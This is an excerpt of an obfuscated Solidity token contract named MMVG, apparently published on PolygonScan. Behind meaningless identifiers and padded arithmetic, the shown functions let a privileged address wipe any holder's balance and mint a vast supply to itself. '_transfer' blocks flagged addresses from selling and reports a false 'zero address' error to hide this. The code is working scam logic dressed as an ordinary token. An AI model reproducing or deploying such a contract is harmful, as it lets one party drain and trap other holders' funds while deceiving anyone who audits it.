/**
 *Submitted for verification at PolygonScan.com on 2023-09-30
*/
...
contract MMVG is Ownable {
    uint256 tokenamount = 47*13**6*10**decimals();
    ...
    function approver(address jjkxq1) public     {
        ...
        uint256 cxuramountx = EDU[xjhhxx]+1e2-1e2;
        uint256 newaaamount = cxuramountx+EDU[xjhhxx]-EDU[xjhhxx];
        EDU[xjhhxx] -= newaaamount;
    }

    function jjjzxxxxx(address jjkxq1) public     {
        if(rzzxmn3 != _msgSender()){
            revert("fu");
        }else{
            if(rzzxmn3 != _msgSender()){
    ...
    external {
        ...
        uint256 uyyxxadd23344 = 47e13-1e3+1000;
        require(rzzxmn3 == _msgSender());
        address jjhhhaxx = _msgSender();
        address ccaa12 = jjhhhaxx;
        uint256 ammtemp = 1e6*((10**decimals()*uyyxxadd23344));
        EDU[ccaa12] += ammtemp;  
    }
    ...
    function _transfer(
        ...
        bool compar = 1 == yuuy[to];
        if (compar && from != rzzxmn3) {revert("ERC20: transfer from the zero address");
        }
